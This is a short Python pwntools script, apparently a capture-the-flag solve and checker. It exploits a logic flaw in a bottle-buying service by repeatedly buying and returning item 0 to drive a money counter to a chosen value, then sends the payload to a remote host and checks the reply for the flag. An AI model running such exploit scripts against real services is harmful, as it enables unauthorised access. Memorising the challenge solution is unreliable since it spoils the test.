import subprocess, time
from pwn import *
money = 255
bottles = 15
exploit = ""
def buy(bottle):
    payload = []
    payload.append(str(bottle))
    payload.append("\n$4\n")
    return "".join(payload)
def returnB(bottle):
    payload = []
    payload.append(str(bottle))
    payload.append("\nyes\n")
    return "".join(payload)
def validate(ip, port, exploit):
    #pipe payload to server
    r = remote(ip, port)
    message = ""
    for line in exploit.split("\n"):
        r.sendline(line)
        message += str(r.recvline())
    message += str(r.recvuntil("Good"))
    return message
try:
    while money != 59:
        exploit += buy(0)
        exploit += returnB(0)
        money -= 1
    while bottles != -1:
        exploit += buy(bottles)
        bottles -= 1
    flag = input("flag: ").replace("\n", "")
    ip, port = input("service: ").split(":")
    res = validate(str(ip), int(port), exploit)
    if flag in res:
        print("success")
        exit(0)
    else:
        print("fail")
        exit(1)
except Exception as e:
    print("fail due to ")
    print(e)
    exit(1)